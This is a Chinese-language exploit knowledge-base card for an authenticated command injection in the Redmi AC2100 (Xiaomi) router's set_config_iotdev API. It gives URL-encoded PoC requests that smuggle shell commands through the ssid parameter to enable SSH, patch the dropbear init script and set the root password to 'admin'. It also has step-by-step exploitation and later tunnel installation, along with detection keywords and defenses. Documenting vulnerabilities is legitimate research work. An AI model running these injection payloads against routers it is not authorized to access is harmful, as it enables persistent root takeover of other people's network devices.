---
id: iot-xiaomi-misystem-set-config-iotdev-ssid-command-injection-ssh
title: 小米/红米路由器 set_config_iotdev ssid 命令注入开启 SSH：持登录 stok 改 nvram ssh_en 并启动 dropbear，root/admin 登录
type: scenario
domain: iot
path: iot
technique: xiaomi-misystem-set-config-iotdev-ssid-command-injection
tags:
- iot
- router
- xiaomi
- redmi-ac2100
- command-injection
- nvram
- dropbear
- ssh
- authentication-required
cve: []
severity: medium
confidence: high
affected_versions: Redmi 路由器 AC2100（RM2100）
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V424
  verified_at: '2026-11-09T17:32:58+08:00'
  notes: 已对照原文全文与图1/2/9核对：型号 Redmi 路由器 AC2100 / RM2100（图1 铭牌）、uname -a 为 Linux XiaoQiang 3.10.14 mips（图9）、SSH 登录出现 XiaoQiang ARE U OK 横幅（图2）；set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B nvram set ssh_en=3D1... 原文首条 URL 与卡内 PoC 逐参数一致，ssid 解码后为 -h; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start;，第二条 echo -e 'admin\nadmin' | passwd root 也一致。未验证点：未复跑（需登录 stok）；dxe 的 channel=debug 绕过开发版限制为对 dropbear 脚本语义的合理推断，原文未展开；非漏洞链未证明最终危害以外的问题。受影响版本按原文明确型号设为 Redmi 路由器 AC2100（RM2100），原文仅称其他小米路由器类似但未验证，不写入版本。dedup 候选 BE10000 xqdatacenter/thrifttunnel、AX9000 CVE-2023-26315 均走 xqdatacenter 子系统，与本卡 misystem/set_config_iotdev 不同入口；dup-scan.json(11-08) 早于建卡(11-09) 无本卡 pair；无 sources/source_url、无文章 ID/原文 URL/长段摘录（保留接口路径与参数作可复用命令），path iot 合法。颗粒度：单一 Web 管理员→root SSH 命令注入原子，后续装隧道工具归另一卡。
url: /docs/iot/iot-xiaomi-misystem-set-config-iotdev-ssid-command-injection-ssh/
draft: false
kb_aliases:
- 小米路由器开启 SSH
- Redmi AC2100 开 SSH
- set_config_iotdev 命令注入
- miwifi ssh_en
- dropbear channel debug
- Xiaomi router root shell
- 红米路由器免刷固件提权
---

## 一句话结论

登录小米/红米路由器后台拿到 `stok` 后，向 `/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev` 的 `ssid` 参数传入 `-h; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start;`，即可把 Web 管理权限升级为 root shell：打开 nvram 的 SSH 开关、把 dropbear 启动脚本的 channel 改成 debug 并立即启动，再配合 `echo -e 'admin\nadmin' | passwd root` 设置 root 密码或用 `passwd root` 改密，就能以 `root` SSH 登录路由器。整个过程不需要刷第三方固件。

## 原理

- **接口与鉴权**：小米路由器的 LuCI 风格接口位于 `/cgi-bin/luci/;stok=<STOK>/...`，`stok` 是管理员登录后由前端携带的会话凭证；`/api/misystem/set_config_iotdev` 本意是配置 IoT 设备（bssid/user_id/ssid 等参数），后端把参数拼进系统命令执行，`ssid` 未做 shell 元字符转义。
- **注入形态**：`ssid` 值以 URL 编码传入；样本用 `-h;` 作为前缀（让拼接后的前半段命令按“带参数”形式处理），随后用 `%3B`（`;`）串联多条命令：`nvram set ssh_en=1` 打开 SSH 开关并 `nvram commit` 持久化到配置分区；`sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear` 把 dropbear 启动脚本的发布通道判断改为 debug（绕过“仅开发版才启动 SSH”的逻辑）；`/etc/init.d/dropbear start` 立即启动 SSH 服务。
- **root 密码**：同一接口可用 `ssid=-h; echo -e 'admin\nadmin' | passwd root;` 把 root 密码设为已知值；也可 SSH 登录后执行 `passwd root` 修改。router 初始 root 密码为随机值，这一步是把访问权固定下来。
- **为什么有效**：① 参数进入 shell 且未转义；② `nvram` 命令直接操作持久配置，`ssh_en=1` 在重启后仍生效；③ dropbear 的 channel 判断只看 nvram/脚本变量，把 `channel` 改成 debug 就解除“仅开发版开 SSH”的限制；④ 全部操作走路由器自带的合法接口与工具，不落地恶意文件。
- **前提边界**：必须持有有效 `stok`（管理员已登录或凭据已知），因此这是“Web 管理员 → root shell”的权限升级与持久化，不是未授权漏洞；不同固件版本的接口路径/参数与 dropbear 脚本可能不同，但同类 `misystem` 接口参数注入思路可复用。

## 触发条件

- 目标为小米/红米路由器，管理后台可达（默认 `miwifi.com` 或网关 IP），攻击者/使用者能登录后台获得 `stok`。
- 固件中 `/api/misystem/set_config_iotdev` 存在且 `ssid` 参数未做 shell 转义（原文在 Redmi AC2100 上验证；作者称其他小米路由器类似）。
- 路由器可执行 `nvram`、`sed`、`/etc/init.d/dropbear`（XiaoQiang 固件默认具备）。
- 22 端口未被上层防火墙阻断（默认 LAN 可达）。

## 利用步骤

1. 浏览器登录路由器后台，从任意带 `stok` 的请求或页面中取得 `stok` 值。
2. 发送开启 SSH 的请求：`/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=<URL 编码的注入命令>`，注入命令为 `-h; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start;`。
3. 发送修改密码请求：`ssid=-h; echo -e 'admin\nadmin' | passwd root;`，或稍后 SSH 登录执行 `passwd root`。
4. `ssh root@<router-ip>` 登录，看到 XiaoQiang/BusyBox 欢迎信息（原文为 “ARE U OK”）即成功。
5. 按需在 SSH 中安装后续工具（代理、隧道客户端等），并通过 nvram 设置保证重启后 SSH 仍开启。

## PoC

按原文请求重写的占位版本（`<STOK>`/`<router>` 为占位符；仅用于自有设备/授权测试，未在公网设备执行）：

```text
GET http://<router>/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B

# 解码后的 ssid 参数：
# -h; nvram set ssh_en=1; nvram commit; sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear; /etc/init.d/dropbear start;

GET http://<router>/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
```

```bash
ssh root@<router>       # 密码 admin（或用 passwd root 改过的值）
```

说明：原文在 Redmi AC2100（RM2100，XiaoQiang 3.10.14 mips 内核）上实测成功并给出 SSH 登录截图；本卡未复跑。

## 变体与关联

- [[iot-xiaomi-be10000-xqdatacenter-thrifttunnel-command-injection]]、[[iot-xiaomi-ax9000-cve-2023-26315-xqdatacenter-plugincenter-command-injection]]：同属小米路由器的认证后命令注入，但入口在 `xqdatacenter`/`thrifttunnel`/`plugincenter` 子系统；本卡是 `misystem/set_config_iotdev` 的 `ssid` 参数，属于经典的“开 SSH/改密码”用法。
- 通用路由器命令注入卡（D-Link/TOTOLINK/TP-Link 等）可对照参数拼 shell 的形态；本卡的独特点是 `nvram` + dropbear channel 修改的持久化组合。
- 变体：不同固件可换 `set_config_iotdev` 的参数名（ssid/bssid/user_id）；无 dropbear 的型号可改为启动 `telnetd`；也可改用其它 `misystem` 接口注入。
- 边界：`stok` 无效/已过期、固件修补了参数转义、22 端口被防火墙限制、dropbear 脚本路径不同或只读根文件系统时失效；重启后若 nvram 未 commit 则 SSH 不会保持。

## 检测与防御

- 检测：路由器 Web 日志中出现对 `/api/misystem/set_config_iotdev` 的请求且 `ssid` 含 `;`、`%3B`、`nvram`、`passwd`、`dropbear`、`sed` 等关键字；非常规 `user_id`（如 `longdike`）或与业务不符的 bssid。
- 检测：设备上 `nvram get ssh_en` 变为 1、dropbear 在非 debug 固件上监听 22 端口、root 密码被改；启动脚本 `/etc/init.d/dropbear` 被 `sed` 修改（可用校验和/只读挂载发现）。
- 防御：路由器管理后台使用强密码并避免暴露到公网；固件升级修补参数注入；对管理 API 做请求审计与 WAF 规则（参数含 shell 元字符即拒绝）；将 `/etc/init.d` 挂载为只读或用完整性校验监控；关闭不必要的 SSH/Telnet。
- 响应：恢复 nvram（`ssh_en=0`）、还原 dropbear 脚本、重置 root 密码、检查是否安装了第三方脚本/隧道客户端并重刷固件；排查同一 stok 的其它请求。
